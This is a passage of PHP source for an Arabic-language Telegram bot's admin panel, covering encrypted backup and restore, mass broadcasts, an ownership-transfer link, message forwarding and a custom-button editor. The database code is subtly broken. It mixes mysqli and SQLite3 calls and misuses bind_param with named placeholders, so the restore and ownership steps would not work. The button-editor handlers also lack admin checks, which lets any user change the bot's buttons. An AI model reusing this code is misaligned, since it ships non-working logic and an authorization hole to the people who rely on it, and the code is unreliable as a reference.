            [['text' => "رفع نسخه احتياطيه", 'callback_data' => "upload_backup"]],
            [['text' => "رجوع", 'callback_data' => "setting"]],
        ]
    ];
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "- اهلا بك في قائمه النسخه الاحتياطيه.",
        'reply_markup' => json_encode($keyboard)
    ]);
    exit;
}

if($data == "get_backup" && isAdmin($db, $from_id)){
    $backup_data = [];

    $users = $db->query("SELECT * FROM users");
    while($row = $users->fetch_assoc()){
        $backup_data['users'][] = $row;
    }

    $groups = $db->query("SELECT * FROM groups");
    while($row = $groups->fetch_assoc()){
        $backup_data['groups'][] = $row;
    }

    $settings = $db->query("SELECT * FROM settings");
    while($row = $settings->fetch_assoc()){
        $backup_data['settings'][] = $row;
    }

    $channels = $db->query("SELECT * FROM forced_channels");
    while($row = $channels->fetch_assoc()){
        $backup_data['forced_channels'][] = $row;
    }

    $admins = $db->query("SELECT * FROM admins");
    while($row = $admins->fetch_assoc()){
        $backup_data['admins'][] = $row;
    }

    $blocks = $db->query("SELECT * FROM blocked_users");
    while($row = $blocks->fetch_assoc()){
        $backup_data['blocked_users'][] = $row;
    }

    $json_data = json_encode($backup_data, JSON_PRETTY_PRINT);
    $encrypted = encryptBackup($json_data);

    $filename = "backup_" . time() . ".enc";
    file_put_contents($filename, $encrypted);

    bot('sendDocument',[
        'chat_id' => $chat_id,
        'document' => new CURLFile($filename),
        'caption' => "النسخة الاحتياطية مشفرة\nلا يمكن فك التشفير بدون المفتاح الخاص"
    ]);

    unlink($filename);

    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "تم جلب النسخه الاحتياطيه بنجاح",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "Nsxa"]]]])
    ]);
    exit;
}

if($data == "upload_backup" && isAdmin($db, $from_id)){
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "ارسل ملف النسخة الاحتياطية (ملف .enc فقط)",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "Nsxa"]]]])
    ]);
    setSetting($db, "upload_backup_mode", $from_id);
    exit;
}

if($document && getSetting($db, "upload_backup_mode") == $from_id){
    $file_name = $document->file_name;
    if(pathinfo($file_name, PATHINFO_EXTENSION) == "enc"){
        $file = bot('getFile',['file_id' => $document->file_id]);
        $file_path = $file->result->file_path;
        $file_url = "https://api.telegram.org/file/bot".API_KEY."/".$file_path;

        $encrypted_data = file_get_contents($file_url);
        $decrypted = decryptBackup($encrypted_data);

        if($decrypted){
            $backup_data = json_decode($decrypted, true);

            if($backup_data && isset($backup_data['users'])){
                $db->begin_transaction();

                $db->query("DELETE FROM users");
                $db->query("DELETE FROM groups");
                $db->query("DELETE FROM settings");
                $db->query("DELETE FROM forced_channels");
                $db->query("DELETE FROM admins");
                $db->query("DELETE FROM blocked_users");

                foreach($backup_data['users'] as $user){
                    $stmt = $db->prepare("INSERT OR REPLACE INTO users (id, username, first_name, is_admin, is_blocked, joined_at) VALUES (:id, :username, :first_name, :is_admin, :is_blocked, :joined_at)");
                    $stmt->bind_param("i", $user['id']);
                    $stmt->bind_param("s", $user['username']);
                    $stmt->bind_param("s", $user['first_name']);
                    $stmt->bind_param("i", $user['is_admin']);
                    $stmt->bind_param("i", $user['is_blocked']);
                    $stmt->bind_param("i", $user['joined_at']);
                    $stmt->execute();
                }

                foreach($backup_data['groups'] as $group){
                    $stmt = $db->prepare("INSERT OR REPLACE INTO groups (id, title, joined_at) VALUES (:id, :title, :joined_at)");
                    $stmt->bind_param("i", $group['id']);
                    $stmt->bind_param("s", $group['title']);
                    $stmt->bind_param("i", $group['joined_at']);
                    $stmt->execute();
                }

                foreach($backup_data['settings'] as $setting){
                    $stmt = $db->prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (:key, :value)");
                    $stmt->bind_param("s", $setting['key']);
                    $stmt->bind_param("s", $setting['value']);
                    $stmt->execute();
                }

                foreach($backup_data['forced_channels'] as $channel){
                    $stmt = $db->prepare("INSERT OR REPLACE INTO forced_channels (id, channel_id, channel_name, channel_link, required_count, current_count, is_active, joined_users, owner_id) VALUES (:id, :channel_id, :channel_name, :channel_link, :required_count, :current_count, :is_active, :joined_users, :owner_id)");
                    $stmt->bind_param("i", $channel['id']);
                    $stmt->bind_param("s", $channel['channel_id']);
                    $stmt->bind_param("s", $channel['channel_name']);
                    $stmt->bind_param("s", $channel['channel_link']);
                    $stmt->bind_param("i", $channel['required_count']);
                    $stmt->bind_param("i", $channel['current_count']);
                    $stmt->bind_param("i", $channel['is_active']);
                    $stmt->bind_param("s", $channel['joined_users']);
                    $stmt->bind_param("i", $channel['owner_id']);
                    $stmt->execute();
                }

                foreach($backup_data['admins'] as $admin){
                    $stmt = $db->prepare("INSERT OR REPLACE INTO admins (user_id) VALUES (:user_id)");
                    $stmt->bind_param("i", $admin['user_id']);
                    $stmt->execute();
                }

                foreach($backup_data['blocked_users'] as $block){
                    $stmt = $db->prepare("INSERT OR REPLACE INTO blocked_users (user_id) VALUES (:user_id)");
                    $stmt->bind_param("i", $block['user_id']);
                    $stmt->execute();
                }

                $db->commit();

                bot('sendMessage',[
                    'chat_id' => $chat_id,
                    'text' => "تم رفع النسخه الاحتياطيه بنجاح",
                    'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "Nsxa"]]]])
                ]);
            }else{
                bot('sendMessage',[
                    'chat_id' => $chat_id,
                    'text' => "الملف غير صالح او تالف",
                    'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "Nsxa"]]]])
                ]);
            }
        }else{
            bot('sendMessage',[
                'chat_id' => $chat_id,
                'text' => "فشل فك التشفير الملف تالف او غير صالح",
                'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "Nsxa"]]]])
            ]);
        }
    }else{
        bot('sendMessage',[
            'chat_id' => $chat_id,
            'text' => "الملف غير صالح يجب رفع ملف .enc فقط",
            'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "Nsxa"]]]])
        ]);
    }
    setSetting($db, "upload_backup_mode", "");
    exit;
}

if($data == "broadcast" && isAdmin($db, $from_id)){
    $keyboard = [
        'inline_keyboard' => [
            [['text' => "رساله للكل", 'callback_data' => "broad|all"], ['text' => "توجيه للكل", 'callback_data' => "forw|all"]],
            [['text' => "رساله للمجموعات", 'callback_data' => "broad|grp"], ['text' => "توجيه للمجموعات", 'callback_data' => "forw|grp"]],
            [['text' => "رساله للاعضاء", 'callback_data' => "broad|priv"], ['text' => "توجيه للاعضاء", 'callback_data' => "forw|priv"]],
            [['text' => "رجوع", 'callback_data' => "setting"]],
        ]
    ];
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "- اوامر الاذاعه الخاصه بالبوت.",
        'reply_markup' => json_encode($keyboard)
    ]);
    exit;
}

if($ex[0] == "broad" && isAdmin($db, $from_id)){
    $type = $ex[1];
    $type_name = $type == "all" ? "للكل" : ($type == "priv" ? "للاعضاء" : "للمجموعات");
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "نوع الاذاعه ( رساله للـ $type_name) \nارسل الرساله الان",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "setting"]]]])
    ]);
    setSetting($db, "broadcast_type", $type);
    setSetting($db, "broadcast_mode", $from_id);
    exit;
}

if($ex[0] == "forw" && isAdmin($db, $from_id)){
    $type = $ex[1];
    $type_name = $type == "all" ? "للكل" : ($type == "priv" ? "للاعضاء" : "للمجموعات");
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "نوع الاذاعه ( توجيه للـ $type_name) \nارسل الرساله الان",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "setting"]]]])
    ]);
    setSetting($db, "forward_type", $type);
    setSetting($db, "forward_mode", $from_id);
    exit;
}

if($message && getSetting($db, "broadcast_mode") == $from_id){
    $type = getSetting($db, "broadcast_type", "all");
    $users = [];

    if($type == "all" || $type == "priv"){
        $query = $db->query("SELECT id FROM users");
        while($row = $query->fetch_assoc()){
            $users[] = $row['id'];
        }
    }
    if($type == "all" || $type == "grp"){
        $query = $db->query("SELECT id FROM groups");
        while($row = $query->fetch_assoc()){
            $users[] = $row['id'];
        }
    }

    $count = 0;
    $failed = 0;

    foreach($users as $user_id){
        $result = bot('sendMessage',[
            'chat_id' => $user_id,
            'text' => $text ?: ($caption ?: "رسالة")
        ]);
        if(isset($result->ok) && $result->ok){
            $count++;
        }else{
            $failed++;
        }
    }

    bot('sendMessage',[
        'chat_id' => $chat_id,
        'text' => "تم اكتمال عمليه الاذاعه بنجاح\n\nمعلومات الاذاعه :\nتم ارسال الاذاعه الي : $count عضو\nفشل في الارسال الي : $failed عضو"
    ]);

    setSetting($db, "broadcast_mode", "");
    setSetting($db, "broadcast_type", "");
    exit;
}

if($message && getSetting($db, "forward_mode") == $from_id){
    $type = getSetting($db, "forward_type", "all");
    $users = [];

    if($type == "all" || $type == "priv"){
        $query = $db->query("SELECT id FROM users");
        while($row = $query->fetch_assoc()){
            $users[] = $row['id'];
        }
    }
    if($type == "all" || $type == "grp"){
        $query = $db->query("SELECT id FROM groups");
        while($row = $query->fetch_assoc()){
            $users[] = $row['id'];
        }
    }

    $count = 0;
    $failed = 0;

    foreach($users as $user_id){
        $result = bot('forwardMessage',[
            'chat_id' => $user_id,
            'from_chat_id' => $chat_id,
            'message_id' => $message_id
        ]);
        if(isset($result->ok) && $result->ok){
            $count++;
        }else{
            $failed++;
        }
    }

    bot('sendMessage',[
        'chat_id' => $chat_id,
        'text' => "تم اكتمال عمليه الاذاعه بنجاح\n\nمعلومات الاذاعه :\nتم ارسال الاذاعه الي : $count عضو\nفشل في الارسال الي : $failed عضو"
    ]);

    setSetting($db, "forward_mode", "");
    setSetting($db, "forward_type", "");
    exit;
}

$MakLink = substr(str_shuffle('AbCdEfGhIjKlMnOpQrStU12345689807'),1,13);
if($data == "thoilmlk" && $from_id == $owner_id){
    $existing_link = getSetting($db, "transfer_link", "");
    if(empty($existing_link)){
        setSetting($db, "transfer_link", $MakLink);
        $link = $MakLink;
    }else{
        $link = $existing_link;
    }
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "تم صنع رابط جاهز لتحويل الملكيه ارسله لاي شخص ليتم تحويل الملكيه اليه\n\n- https://t.me/$bot_username?start=$link",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "setting"]]]])
    ]);
    exit;
}

if(preg_match("/start (.+)/", $text ?? '', $matches)){
    $code = $matches[1];
    $transfer_link = getSetting($db, "transfer_link", "");
    if($code == $transfer_link && $from_id != $owner_id){
        $stmt = $db->prepare("INSERT OR REPLACE INTO admins (user_id) VALUES (:user_id)");
        $stmt->bindValue(':user_id', $from_id, SQLITE3_INTEGER);
        $stmt->execute();

        setSetting($db, "owner_id", $from_id);
        setSetting($db, "transfer_link", "");

        bot('sendMessage',[
            'chat_id' => $chat_id,
            'text' => "تم تحويل الملكيه اليك بنجاح"
        ]);

        bot('sendMessage',[
            'chat_id' => $owner_id,
            'text' => "تم تحويل الملكيه لـ ([$name](tg://user?id=$from_id)) \nايديه : `$from_id`"
        ]);
    }
    exit;
}

$notify_status = getSetting($db, "notify_status", "✅");
if($notify_status == "✅" && $text && $text != "/start" && $message && $type == "private" && !isAdmin($db, $from_id)){
    $stmt = $db->prepare("SELECT joined_at FROM users WHERE id = :id");
    $stmt->bindValue(':id', $from_id, SQLITE3_INTEGER);
    $result = $stmt->execute();
    $user_data = $result->fetch_assoc();
    if($user_data && (time() - $user_data['joined_at']) < 5){
        bot('sendMessage',[
            'chat_id' => $owner_id,
            'text' => "• تم دخول شخص جديد الى البوت\n\nالاسم: $name\nاليوزر: @" . ($user ?: "لا يوجد") . "\nالايدي: $from_id\nعدد الاعضاء: $total_users"
        ]);
    }
}

$twasl_status = getSetting($db, "twasl_status", "❌");
if($twasl_status == "✅" && $message && $type == "private" && !isAdmin($db, $from_id) && $text != "/start"){
    bot('forwardMessage',[
        'chat_id' => $owner_id,
        'from_chat_id' => $chat_id,
        'message_id' => $message_id
    ]);
    bot('sendMessage',[
        'chat_id' => $owner_id,
        'text' => "👤 المرسل: $name\n🆔 ايدي: $from_id\n@" . ($user ?: "لا يوجد"),
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => "✉️ رد على العضو", 'callback_data' => "reply_user|$from_id"]],
                [['text' => "🚫 حظر العضو", 'callback_data' => "block_user|$from_id"]]
            ]
        ])
    ]);
    bot('sendMessage',[
        'chat_id' => $from_id,
        'text' => "✅ تم توجيه رسالتك للادمن"
    ]);
    exit;
}

if($ex[0] == "reply_user" && isAdmin($db, $from_id)){
    $user_id = $ex[1];
    setSetting($db, "reply_to_user", $user_id);
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "ارسل الرسالة التي تريد ارسالها للعضو",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "setting"]]]])
    ]);
    setSetting($db, "reply_mode", $from_id);
    exit;
}

if($text && getSetting($db, "reply_mode") == $from_id){
    $user_id = getSetting($db, "reply_to_user", "");
    if($user_id){
        bot('sendMessage',[
            'chat_id' => $user_id,
            'text' => "• رد من الادمن:\n\n$text"
        ]);
        bot('sendMessage',[
            'chat_id' => $chat_id,
            'text' => "✅ تم ارسال ردك الى العضو"
        ]);
        setSetting($db, "reply_mode", "");
        setSetting($db, "reply_to_user", "");
    }
    exit;
}

if($ex[0] == "block_user" && isAdmin($db, $from_id)){
    $user_id = $ex[1];
    $stmt = $db->prepare("INSERT OR IGNORE INTO blocked_users (user_id) VALUES (:user_id)");
    $stmt->bindValue(':user_id', $user_id, SQLITE3_INTEGER);
    $stmt->execute();
    bot('answerCallbackQuery',[
        'callback_query_id' => $callback_query->id,
        'text' => "تم حظر العضو بنجاح",
        'show_alert' => true
    ]);
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "✅ تم حظر العضو"
    ]);
    exit;
}
$joo_azrar['main_buttons_status'] = $joo_azrar['main_buttons_status'] ?? "✅";
if ($data == "zrar") {
$rows = $joo_azrar['rows'] ?? [];
foreach($rows as $ri => $row){
$has_buttons = false;
foreach($row as $btn_id){
if(isset($joo_azrar['joos'][$btn_id]) || isset($joo_azrar['links'][$btn_id])){
$has_buttons = true;
break;
}
}
if(!$has_buttons){
unset($rows[$ri]);
}
}
$rows = array_values($rows);
$joo_azrar['rows'] = $rows;
save($joo_azrar);
$reply_markup = [];
foreach ($rows as $i => $row) {
$currentRow = [];
foreach ($row as $btn_id) {
if (isset($joo_azrar['joos'][$btn_id])) {
$color = $joo_azrar['joos'][$btn_id]['color'] ?? "default";
if($color == "default"){$color = "primary";}
$emoji = $joo_azrar['joos'][$btn_id]['emoji'] ?? null;
if($emoji){
$currentRow[] = ['text' => $joo_azrar['joos'][$btn_id]['name'], 'callback_data' => 'zh|' . $btn_id, 'style' => $color, 'icon_custom_emoji_id' => $emoji];
} else {
$currentRow[] = ['text' => $joo_azrar['joos'][$btn_id]['name'], 'callback_data' => 'zh|' . $btn_id, 'style' => $color];
}
} elseif (isset($joo_azrar['links'][$btn_id])) {
$color = $joo_azrar['links'][$btn_id]['color'] ?? "default";
if($color == "default"){$color = "primary";}
$emoji = $joo_azrar['links'][$btn_id]['emoji'] ?? null;
if($emoji){
$currentRow[] = ['text' => $joo_azrar['links'][$btn_id]['name'], 'url' => $joo_azrar['links'][$btn_id]['url'], 'style' => $color, 'icon_custom_emoji_id' => $emoji];
} else {
$currentRow[] = ['text' => $joo_azrar['links'][$btn_id]['name'], 'url' => $joo_azrar['links'][$btn_id]['url'], 'style' => $color];
}
}
}
if(!empty($currentRow)){
$currentRow[] = ['text' => '➕', 'callback_data' => 'addbtn|' . $i];
$reply_markup[] = $currentRow;
}
}
$reply_markup[] = [['text' => '➕ اضافة صف جديد', 'callback_data' => 'addbtn']];
$reply_markup[] = [['text' => "الازرار الاساسية : {$joo_azrar['main_buttons_status']}", 'callback_data' => "toggle_main_buttons"]];
$reply_markup[] = [['text' => 'رجوع', 'callback_data' => 'setting']];
$reply_markup = json_encode(['inline_keyboard' => $reply_markup]);
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• مرحبا بك في قسم الازرار\n- يمكنك اضافة ازرار جديدة او حذفها",
'parse_mode' => 'markdown',
'reply_markup' => $reply_markup,
]);
$joo_azrar['n'] = null;
$joo_azrar['mode'] = null;
save($joo_azrar);
exit;
}
if ($data == "toggle_main_buttons") {
$joo_azrar['main_buttons_status'] = ($joo_azrar['main_buttons_status'] == "✅") ? "❌" : "✅";
save($joo_azrar);
$rows = $joo_azrar['rows'] ?? [];
$reply_markup = [];
foreach ($rows as $i => $row) {
$currentRow = [];
foreach ($row as $btn_id) {
if (isset($joo_azrar['joos'][$btn_id])) {
$color = $joo_azrar['joos'][$btn_id]['color'] ?? "default";
if($color == "default"){$color = "primary";}
$emoji = $joo_azrar['joos'][$btn_id]['emoji'] ?? null;
if($emoji){
$currentRow[] = ['text' => $joo_azrar['joos'][$btn_id]['name'], 'callback_data' => 'zh|' . $btn_id, 'style' => $color, 'icon_custom_emoji_id' => $emoji];
} else {
$currentRow[] = ['text' => $joo_azrar['joos'][$btn_id]['name'], 'callback_data' => 'zh|' . $btn_id, 'style' => $color];
}
} elseif (isset($joo_azrar['links'][$btn_id])) {
$color = $joo_azrar['links'][$btn_id]['color'] ?? "default";
if($color == "default"){$color = "primary";}
$emoji = $joo_azrar['links'][$btn_id]['emoji'] ?? null;
if($emoji){
$currentRow[] = ['text' => $joo_azrar['links'][$btn_id]['name'], 'url' => $joo_azrar['links'][$btn_id]['url'], 'style' => $color, 'icon_custom_emoji_id' => $emoji];
} else {
$currentRow[] = ['text' => $joo_azrar['links'][$btn_id]['name'], 'url' => $joo_azrar['links'][$btn_id]['url'], 'style' => $color];
}
}
}
$currentRow[] = ['text' => '➕', 'callback_data' => 'addbtn|' . $i];
$reply_markup[] = $currentRow;
}
$reply_markup[] = [['text' => '➕ اضافة صف جديد', 'callback_data' => 'addbtn']];
$reply_markup[] = [['text' => "الازرار الاساسية : {$joo_azrar['main_buttons_status']}", 'callback_data' => "toggle_main_buttons"]];
$reply_markup[] = [['text' => 'رجوع', 'callback_data' => 'setting']];
$reply_markup = json_encode(['inline_keyboard' => $reply_markup]);
bot('editMessageReplyMarkup', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'reply_markup' => $reply_markup,
]);
exit;
}
if($text == "مشاهدة الازرار" or $text == 'مشاهده الازرار'){
$tm = "";
foreach ($update->message->reply_to_message->reply_markup->inline_keyboard as $row) {
foreach ($row as $button) {
if (isset($button->text)) {
$r = $button->text;
$dat = $button->callback_data ?? $button->url;
if($button->callback_data){
$dat = "joo:". base64_encode($dat);
}
$tm = $tm ."\n • $r -> `$dat`";
}
}
}
bot("sendmessage",[
'chat_id' => $chat_id,
'text' => $tm."\n\n• الكودات الخاصة بالازرار",
'parse_mode' => 'markdown',
'reply_to_message_id' => $message_id,
]);
exit();
}
if (preg_match("/^addbtn(\\|(.+))?$/", $data, $m)) {
$joo_azrar['mode'] = 'add';
$joo_azrar['row_index'] = isset($m[2]) ? (int)$m[2] : count($joo_azrar['rows'] ?? []);
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• ارسل اسم الزر المراد اضافته\n- يمكنك استخدام ايموجي مميز مع النص",
'parse_mode' => 'markdown',
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => 'رجوع', 'callback_data' => 'zrar']]
]
])
]);
save($joo_azrar);
exit;
}
if ($text != '/start' && $text != null && $joo_azrar['mode'] == 'add') {
$emoji_id = null;
$clean_text = $text;
if(isset($update->message->entities)){
foreach($update->message->entities as $ent){
if($ent->type == "custom_emoji"){
$emoji_id = $ent->custom_emoji_id;
$offset = $ent->offset;
$length = $ent->length;
$clean_text = mb_substr($text, 0, $offset) . mb_substr($text, $offset + $length);
}
}
}
$clean_text = preg_replace('/[\x{1F300}-\x{1FAFF}]/u', '', $clean_text);
$clean_text = trim($clean_text);
$joo_azrar['n'] = $clean_text;
if($emoji_id){
$joo_azrar['n_emoji'] = $emoji_id;
} else {
$joo_azrar['n_emoji'] = null;
}
$joo_azrar['mode'] = 'addm';
save($joo_azrar);
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "• ارسل الان المحتوى المراد اضافته الى الزر\n\n- يمكنك ارسال نص (يدعم الماركداون)\n- يمكنك ارسال رابط يبدأ بـ http\n- يمكنك ارسال كود كول باك",
'parse_mode' => 'MarkDown',
]);
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "• يمكنك استخدام الهاشتاجات التالية:\n1. #name : اسم الشخص\n2. #username : معرف المستخدم\n3. #id : ايدي الشخص\n4. #coin : رصيد الشخص\n5. #coin_used : الرصيد المستخدم\n6. #orders_count : عدد طلباتك\n7. #bot_orders : عدد طلبات البوت\n8. #invites : عدد دعواتك\n9. #invite_points : نقاط الدعوة\n10. #invite_link : رابط الدعوة الخاص بك\n11. #top_invites : ترتيب المدعوين\n12. #funding_count : عدد التمويلات النشطة\n13. #funding_channels : قنوات تحت التمويل\n14. #currency : اسم عملة البوت",
//'parse_mode' => 'MarkDown',
]);
exit;
}
if ($text != '/start' && $joo_azrar['mode'] == 'addm') {
$code = uniqid();
$row = $joo_azrar['row_index'] ?? 0;
$name = $joo_azrar['n'];
$emoji_id = $joo_azrar['n_emoji'] ?? null;
if (preg_match("#^https?://#", $text)) {
$joo_azrar['links'][$code] = [
'name' => $name,
'emoji' => $emoji_id,
'url' => $text,
'color' => 'default'
];
$joo_azrar['rows'][$row][] = $code;
$replyText = "• تم حفظ الزر (رابط)";
} elseif (preg_match("#^joo:#", $text)) {
$callback = base64_decode(str_replace("joo:", "", $text));
$joo_azrar['joos'][$code] = [
'name' => $name,
'emoji' => $emoji_id,
'mo' => $callback,
'Type' => 'callback',
'color' => 'default'
];
$joo_azrar['rows'][$row][] = $code;
$replyText = "• تم حفظ الزر (كول باك)";
} else {
$joo_azrar['joos'][$code] = [
'name' => $name,
'emoji' => $emoji_id,
'mo' => $text,
'Type' => 'EditMessageText',
'color' => 'default'
];
$joo_azrar['rows'][$row][] = $code;
$replyText = "• تم حفظ الزر (نص)";
}
$joo_azrar['n'] = null;
$joo_azrar['n_emoji'] = null;
$joo_azrar['mode'] = null;
unset($joo_azrar['row_index']);
save($joo_azrar);
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => $replyText,
'parse_mode' => 'MarkDown',
'reply_markup' => json_encode([
'inline_keyboard' => [[['text' => 'رجوع', 'callback_data' => 'zrar']]]
])
]);
exit;
}
$zhend = explode("|", $data);
if ($zhend[0] == "zh") {
$id = $zhend[1];
if (isset($joo_azrar['joos'][$id])) {
$btn = $joo_azrar['joos'][$id];
$name = $btn['name'];
$mo = $btn['mo'];
$type = $btn['Type'];
$current_color = $btn['color'] ?? "default";
$emoji = $btn['emoji'] ?? null;
$color_display = "عادي";
if($current_color == "danger"){$color_display = "احمر";}
if($current_color == "primary"){$color_display = "ازرق";}
if($current_color == "success"){$color_display = "اخضر";}
if($current_color == "default"){$color_display = "عادي";}
$buttons = [];
if ($type == "callback") {
$fro = "كود كول باك";
$buttons[] = [['text' => "🎨 تغيير اللون (الحالي: $color_display)", 'callback_data' => "color_menu|$id"]];
$buttons[] = [['text' => "🗑 مسح الزر", 'callback_data' => "delete|$id"]];
$buttons[] = [['text' => "🔙 رجوع", 'callback_data' => "zrar"]];
} else {
$fro = "محتوى نصي";
$show = [
"EditMessageText" => "تعديل الرسالة",
"sendMessage" => "ارسال الرسالة",
"sendMessageSilent" => "همسة"
][$type] ?? "تعديل الرسالة";
$buttons[] = [['text' => "🎨 تغيير اللون (الحالي: $color_display)", 'callback_data' => "color_menu|$id"]];
$buttons[] = [['text' => "📝 طريقة العرض: $show", 'callback_data' => "showtype:$id"]];
$buttons[] = [['text' => "✏️ تعديل المحتوى", 'callback_data' => "editcontent|$id"]];
$buttons[] = [['text' => "🗑 مسح الزر", 'callback_data' => "delete|$id"]];
$buttons[] = [['text' => "🔙 رجوع", 'callback_data' => "zrar"]];
}
bot('editMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• اسم الزر:™[$name] \n\n• نوع الزر: $fro\n\n`$mo`",
'parse_mode' => "markdown",
'disable_web_page_preview' => true,
'reply_markup' => json_encode(['inline_keyboard' => $buttons])
]);
exit;
}
if (isset($joo_azrar['links'][$id])) {
$name = $joo_azrar['links'][$id]['name'];
$url = $joo_azrar['links'][$id]['url'];
$current_color = $joo_azrar['links'][$id]['color'] ?? "default";
$color_display = "عادي";
if($current_color == "danger"){$color_display = "احمر";}
if($current_color == "primary"){$color_display = "ازرق";}
if($current_color == "success"){$color_display = "اخضر";}
if($current_color == "default"){$color_display = "عادي";}
$buttons = [
[['text' => "🎨 تغيير اللون (الحالي: $color_display)", 'callback_data' => "color_menu_link|$id"]],
[['text' => "🔗 تعديل الرابط", 'callback_data' => "editlink|$id"]],
[['text' => "🗑 مسح الزر", 'callback_data' => "delete|$id"]],
[['text' => "🔙 رجوع", 'callback_data' => "zrar"]]
];
bot('editMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• اسم الزر: [$name] \n\n• نوع الزر: رابط خارجي\n\n`$url`",
'parse_mode' => "markdown",
'disable_web_page_preview' => true,
'reply_markup' => json_encode(['inline_keyboard' => $buttons])
]);
exit;
}
}
if(preg_match("/^color_menu\|(.+)$/", $data, $m)){
$id = $m[1];
$color_options = [
['text' => "🔴 احمر", 'callback_data' => "changecolor|$id|danger"],
['text' => "🔵 ازرق", 'callback_data' => "changecolor|$id|primary"],
['text' => "🟢 اخضر", 'callback_data' => "changecolor|$id|success"],
['text' => "⚪ عادي (بدون لون)", 'callback_data' => "changecolor|$id|default"]
];
bot('editMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• اختر اللون الجديد للزر",
'parse_mode' => "markdown",
'reply_markup' => json_encode(['inline_keyboard' => [$color_options, [['text' => "🔙 رجوع", 'callback_data' => "zh|$id"]]]])
]);
exit;
}
if(preg_match("/^color_menu_link\|(.+)$/", $data, $m)){
$id = $m[1];
$color_options = [
['text' => "🔴 احمر", 'callback_data' => "changelinkcolor|$id|danger"],
['text' => "🔵 ازرق", 'callback_data' => "changelinkcolor|$id|primary"],
['text' => "🟢 اخضر", 'callback_data' => "changelinkcolor|$id|success"],
['text' => "⚪ عادي (بدون لون)", 'callback_data' => "changelinkcolor|$id|default"]
];
bot('editMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• اختر اللون الجديد للزر",
'parse_mode' => "markdown",
'reply_markup' => json_encode(['inline_keyboard' => [$color_options, [['text' => "🔙 رجوع", 'callback_data' => "zh|$id"]]]])
]);
exit;
}
if(preg_match("/^changecolor\|(.+)\|(.+)$/", $data, $m)){
$id = $m[1];
$new_color = $m[2];
if(isset($joo_azrar['joos'][$id])){
$joo_azrar['joos'][$id]['color'] = $new_color;
save($joo_azrar);
$color_name = "عادي";
if($new_color == "danger"){$color_name = "احمر";}
if($new_color == "primary"){$color_name = "ازرق";}
if($new_color == "success"){$color_name = "اخضر";}
bot('answerCallbackQuery',['callback_query_id'=>$update->callback_query->id,'text'=>"تم تغيير اللون الى $color_name",'show_alert'=>false]);
bot('editMessageText',[
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• تم تغيير لون الزر الى $color_name بنجاح",
'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "zh|$id"]]]])
]);
}
exit;
}
if(preg_match("/^changelinkcolor\|(.+)\|(.+)$/", $data, $m)){
$id = $m[1];
$new_color = $m[2];
if(isset($joo_azrar['links'][$id])){
$joo_azrar['links'][$id]['color'] = $new_color;
save($joo_azrar);
$color_name = "عادي";
if($new_color == "danger"){$color_name = "احمر";}
if($new_color == "primary"){$color_name = "ازرق";}
if($new_color == "success"){$color_name = "اخضر";}
bot('answerCallbackQuery',['callback_query_id'=>$update->callback_query->id,'text'=>"تم تغيير اللون الى $color_name",'show_alert'=>false]);
bot('editMessageText',[
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• تم تغيير لون الزر الى $color_name بنجاح",
'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "zh|$id"]]]])
]);
}
exit;
}
if(preg_match("/^editcontent\|(.+)$/", $data, $m)){
$id = $m[1];
if(isset($joo_azrar['joos'][$id])){
$joo_azrar['mode'] = "editcontent";
$joo_azrar['edit_id'] = $id;
save($joo_azrar);
bot('editMessageText',[
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• ارسل المحتوى الجديد للزر\n\nيمكنك استخدام الهاشتاجات:\n#name, #username, #id, #coin",
'parse_mode' => 'markdown',
'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "zh|$id"]]]])
]);
}
exit;
}
if($joo_azrar['mode'] == "editcontent" && $text != null && $text != "/start"){
$id = $joo_azrar['edit_id'];
if(isset($joo_azrar['joos'][$id])){
$joo_azrar['joos'][$id]['mo'] = $text;
$joo_azrar['mode'] = null;
unset($joo_azrar['edit_id']);
save($joo_azrar);
bot('sendMessage',[
